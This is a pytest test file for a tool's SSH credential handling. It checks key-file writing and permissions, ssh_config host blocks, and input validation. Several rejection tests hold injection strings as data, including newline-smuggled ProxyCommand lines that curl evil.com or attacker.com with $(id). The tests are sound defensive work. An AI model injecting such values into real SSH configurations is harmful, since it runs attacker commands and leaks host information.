"""Tests für SSH-Credential-Management (ssh.py + store.py-Integration)."""
from __future__ import annotations

import os
from pathlib import Path
from unittest.mock import patch

import pytest

from hydrahive.credentials.ssh import (
    _SECTION_END,
    _SECTION_START,
    _build_host_block,
    rebuild_ssh_config,
    remove_ssh_key,
    write_ssh_key,
)


@pytest.fixture()
def ssh_dir(tmp_path, monkeypatch):
    """Temporäres data_dir mit .ssh-Verzeichnis."""
    _ssh = tmp_path / "hydrahive" / ".ssh"
    monkeypatch.setattr("hydrahive.credentials.ssh._ssh_dir", lambda: _ssh)
    return _ssh


# --- write_ssh_key ---

def test_write_ssh_key_creates_file(ssh_dir):
    path = write_ssh_key("alice", "testserver", "-----BEGIN OPENSSH PRIVATE KEY-----\nDATA\n-----END OPENSSH PRIVATE KEY-----")
    assert path.exists()
    assert "cred_alice_testserver_key" in path.name


def test_write_ssh_key_sets_permissions(ssh_dir):
    path = write_ssh_key("alice", "testserver", "KEY")
    mode = oct(os.stat(path).st_mode)[-3:]
    assert mode == "600"


def test_write_ssh_key_appends_newline(ssh_dir):
    path = write_ssh_key("alice", "srv", "KEY_WITHOUT_NEWLINE")
    assert path.read_text().endswith("\n")


# --- remove_ssh_key ---

def test_remove_ssh_key_deletes_file(ssh_dir):
    path = write_ssh_key("alice", "testserver", "KEY")
    assert path.exists()
    remove_ssh_key("alice", "testserver")
    assert not path.exists()


def test_remove_ssh_key_missing_file_is_silent(ssh_dir):
    remove_ssh_key("alice", "nonexistent")  # darf nicht werfen


# --- _build_host_block ---

def test_build_host_block_contains_host(ssh_dir):
    block = _build_host_block("192.168.1.1", "root", Path("/keys/mykey"))
    assert "Host 192.168.1.1" in block
    assert "User root" in block
    assert "IdentityFile /keys/mykey" in block
    assert "StrictHostKeyChecking accept-new" in block


@pytest.mark.parametrize("bad_host", [
    "192.168.1.1\nProxyCommand curl http://evil.com/$(id)",
    "host with spaces",
    "host\r\nProxyCommand evil",
    "a" * 254,
    "",
    "*",
])
def test_build_host_block_rejects_injection_in_host(ssh_dir, bad_host):
    with pytest.raises(ValueError):
        _build_host_block(bad_host, "root", Path("/keys/key"))


@pytest.mark.parametrize("bad_user", [
    "root\nProxyCommand evil",
    "user name",
    "user;evil",
    "",
    "a" * 33,
])
def test_build_host_block_rejects_injection_in_user(ssh_dir, bad_user):
    with pytest.raises(ValueError):
        _build_host_block("192.168.1.1", bad_user, Path("/keys/key"))


# --- rebuild_ssh_config ---

def test_rebuild_creates_config_with_section(ssh_dir):
    ssh_dir.mkdir(parents=True, exist_ok=True)
    key_path = ssh_dir / "cred_alice_srv_key"
    key_path.write_text("KEY")
    rebuild_ssh_config([("alice", "srv", "192.168.1.2", "joshua")])
    config = (ssh_dir / "config").read_text()
    assert _SECTION_START in config
    assert "Host 192.168.1.2" in config
    assert "User joshua" in config
    assert _SECTION_END in config


def test_rebuild_preserves_manual_section(ssh_dir):
    ssh_dir.mkdir(parents=True, exist_ok=True)
    manual = "Host github.com\n    User git\n    IdentityFile ~/.ssh/id_github\n"
    (ssh_dir / "config").write_text(manual)
    rebuild_ssh_config([("alice", "srv", "10.0.0.1", "root")])
    config = (ssh_dir / "config").read_text()
    assert "Host github.com" in config
    assert "Host 10.0.0.1" in config


def test_rebuild_empty_credentials_removes_section(ssh_dir):
    ssh_dir.mkdir(parents=True, exist_ok=True)
    content = f"# manual\n\n{_SECTION_START}\nHost old\n{_SECTION_END}\n"
    (ssh_dir / "config").write_text(content)
    rebuild_ssh_config([])
    config = (ssh_dir / "config").read_text()
    assert _SECTION_START not in config
    assert "Host old" not in config
    assert "# manual" in config


def test_rebuild_sets_config_permissions(ssh_dir):
    ssh_dir.mkdir(parents=True, exist_ok=True)
    rebuild_ssh_config([])
    mode = oct(os.stat(ssh_dir / "config").st_mode)[-3:]
    assert mode == "600"


def test_rebuild_replaces_existing_hh_section(ssh_dir):
    ssh_dir.mkdir(parents=True, exist_ok=True)
    key_path = ssh_dir / "cred_alice_old_key"
    key_path.write_text("KEY")
    rebuild_ssh_config([("alice", "old", "10.0.0.1", "user")])
    key_path2 = ssh_dir / "cred_alice_new_key"
    key_path2.write_text("KEY2")
    rebuild_ssh_config([("alice", "new", "10.0.0.2", "admin")])
    config = (ssh_dir / "config").read_text()
    assert "10.0.0.1" not in config
    assert "10.0.0.2" in config


# --- store-Integration: ssh_key-Validierung ---

@pytest.fixture()
def store_tmp(tmp_path, monkeypatch):
    monkeypatch.setattr("hydrahive.credentials.store.settings",
                        type("S", (), {"data_dir": tmp_path})())
    monkeypatch.setattr("hydrahive.credentials.ssh._ssh_dir",
                        lambda: tmp_path / ".ssh")
    return tmp_path


def test_save_credential_ssh_key_requires_host(store_tmp):
    from hydrahive.credentials.models import Credential
    from hydrahive.credentials.store import save_credential
    cred = Credential(name="test", type="ssh_key", value="KEY",
                      url_pattern="*", header_name="root")
    ok, err = save_credential("alice", cred)
    assert not ok
    assert "ssh_host" in err


def test_save_credential_ssh_key_requires_user(store_tmp):
    from hydrahive.credentials.models import Credential
    from hydrahive.credentials.store import save_credential
    cred = Credential(name="test", type="ssh_key", value="KEY",
                      url_pattern="192.168.1.1", header_name="")
    ok, err = save_credential("alice", cred)
    assert not ok
    assert "ssh_user" in err


@pytest.mark.parametrize("bad_host", [
    "evil.com\nProxyCommand curl http://attacker.com/$(id)",
    "host with spaces",
    "192.168.1.1;evil",
])
def test_save_credential_ssh_key_rejects_invalid_host(store_tmp, bad_host):
    from hydrahive.credentials.models import Credential
    from hydrahive.credentials.store import save_credential
    cred = Credential(name="test", type="ssh_key", value="KEY",
                      url_pattern=bad_host, header_name="root")
    ok, err = save_credential("alice", cred)
    assert not ok
    assert "ssh_host_invalid" in err


@pytest.mark.parametrize("bad_user", [
    "root\nProxyCommand evil",
    "user;evil",
    "user name",
])
def test_save_credential_ssh_key_rejects_invalid_user(store_tmp, bad_user):
    from hydrahive.credentials.models import Credential
    from hydrahive.credentials.store import save_credential
    cred = Credential(name="test", type="ssh_key", value="KEY",
                      url_pattern="192.168.1.1", header_name=bad_user)
    ok, err = save_credential("alice", cred)
    assert not ok
    assert "ssh_user_invalid" in err
